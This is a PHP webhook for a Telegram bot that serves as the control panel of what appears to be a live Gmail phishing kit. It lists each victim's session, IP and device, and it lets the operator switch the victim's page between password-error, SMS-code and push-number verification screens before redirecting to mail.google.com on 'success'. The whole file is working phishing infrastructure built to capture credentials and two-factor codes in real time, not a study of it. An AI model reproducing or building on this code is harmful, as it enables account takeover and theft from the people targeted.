<?php
// webhook.php — Gmail Telegram webhook
// KEY FIX: Send 200 OK to Telegram IMMEDIATELY, then do all processing after.

require 'config.php';

$raw    = file_get_contents('php://input');
$update = json_decode($raw, true);

// ════════════════════════════════════════════════
//  SEND 200 OK TO TELEGRAM RIGHT NOW — DO NOT MOVE
// ════════════════════════════════════════════════
http_response_code(200);
header('Content-Type: text/plain');
header('Connection: close');

if (ob_get_level()) ob_end_clean();
ob_start();
echo 'ok';
header('Content-Length: ' . ob_get_length());
ob_end_flush();
flush();

if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request();
}

// ════════════════════════════════════════════════
//  ALL PROCESSING HAPPENS AFTER TELEGRAM IS FREED
// ════════════════════════════════════════════════

if (!$update) exit;

/* ══ Handle /commands ══ */
if (isset($update['message']['text'])) {
    $txt = trim($update['message']['text']);

    if (in_array($txt, ['/start', '/menu', '/panel'])) {
        tg_send(
            "👋 <b>Gmail — Admin Panel</b>\n\n" .
            "Visitors will appear here when they load the page.\n" .
            "You'll get a control panel for each visitor automatically.\n\n" .
            "/status — list active visitors",
            [[['text' => '🔄 Refresh Status', 'callback_data' => 'status']]]
        );
    }

    if ($txt === '/status') {
        $files = glob(SESSIONS_DIR . '/v_*.json');
        if (!$files) {
            tg_send("📭 No active visitors right now.");
        } else {
            $msg = "👥 <b>Active Visitors (" . count($files) . ")</b>\n\n";
            foreach ($files as $f) {
                $v = json_decode(file_get_contents($f), true);
                if (!$v) continue;
                $msg .= "🆔 <code>{$v['sid']}</code>\n";
                $msg .= "📍 Page: <b>{$v['page']}</b> | 🌐 IP: <code>{$v['ip']}</code>\n";
                $msg .= "💻 {$v['device_os']} | 🌍 {$v['device_browser']}\n";
                $msg .= "⏰ {$v['created']}\n\n";
            }
            tg_send($msg);
        }
    }

    if ($txt === '/clear') {
        $files = glob(SESSIONS_DIR . '/v_*.json');
        foreach (($files ?: []) as $f) unlink($f);
        tg_send("🗑️ All visitor sessions cleared.");
    }

    exit;
}

/* ══ Handle inline button presses ══ */
if (!isset($update['callback_query'])) exit;

$cb     = $update['callback_query'];
$cqid   = $cb['id'];
$data   = $cb['data'] ?? '';
$parts  = explode('|', $data);
$action = $parts[0] ?? '';
$sid    = $parts[1] ?? '';
$extra  = $parts[2] ?? '';

// Dismiss Telegram button spinner — after 200 OK already sent
tg_answer($cqid, '');

// Status refresh (no sid)
if ($action === 'status') {
    $files = glob(SESSIONS_DIR . '/v_*.json');
    $msg   = $files
        ? "👥 <b>Active: " . count($files) . " visitor(s)</b>\n"
        : "📭 No active visitors.";
    foreach (($files ?: []) as $f) {
        $v = json_decode(file_get_contents($f), true);
        if ($v) $msg .= "\n• <code>{$v['sid']}</code> → <b>{$v['page']}</b>";
    }
    tg_send($msg);
    exit;
}

if (!$sid) exit;

switch ($action) {

    // Back to panel
    case 'panel':
        tg_panel($sid);
        break;

    // ✅ YES Prompt page
    case 'yp':
        set_state($sid, ['page' => 'verify_yes']);
        tg_after_prompt($sid, 'yes', 0); // 0 = no number for YES prompt
        break;

    // 🔔 Number Prompt — show grid first
    case 'np':
        tg_number_grid($sid);
        break;

    // Number chosen from grid — show prompt page with that number
    case 'pn':
        $num = (int)$extra;
        if ($num < 1 || $num > 100) break;
        set_state($sid, ['page' => 'verify_prompt', 'prompt_number' => $num]);
        tg_after_prompt($sid, 'number', $num); // ← passes chosen number into message
        break;

    // 📱 SMS Verification
    case 'sms':
        set_state($sid, ['page' => 'verify_sms']);
        tg_after_sms($sid);
        break;

    // ❌ Password Error
    case 'pwe':
        set_state($sid, ['page' => 'pw_error']);
        tg_send("❌ <b>Password error shown</b>\n🆔 <code>{$sid}</code>\nWaiting for retry...");
        break;

    // ⏳ Keep Loading
    case 'ld':
        set_state($sid, ['page' => 'loading']);
        break;

    // ❌ SMS wrong code error
    case 'smse':
        set_state($sid, ['page' => 'sms_error']);
        tg_after_sms($sid);
        break;

    // ❌ Prompt mismatch error
    case 'pme':
        set_state($sid, ['page' => 'prompt_error']);
        break;

    // 💛 SUCCESS
    case 'ok':
        set_state($sid, ['page' => 'success']);
        tg_send("🎉 <b>SUCCESS</b>\n🆔 <code>{$sid}</code>\n✅ Redirected to https://mail.google.com/");
        break;

    // 🛑 Block visitor
    case 'blk':
        set_state($sid, ['page' => 'blocked', 'blocked' => true]);
        tg_send("🛑 <b>Visitor blocked</b>\n🆔 <code>{$sid}</code>");
        break;
}

exit;
